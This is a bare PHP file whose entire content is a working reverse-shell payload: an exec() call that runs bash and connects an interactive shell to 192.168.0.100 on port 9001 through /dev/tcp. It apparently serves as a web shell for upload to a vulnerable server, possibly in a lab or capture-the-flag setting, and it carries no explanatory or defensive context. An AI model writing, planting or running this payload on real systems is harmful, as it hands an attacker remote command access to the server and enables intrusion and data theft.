<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.100/9001 0>&1'");
?>
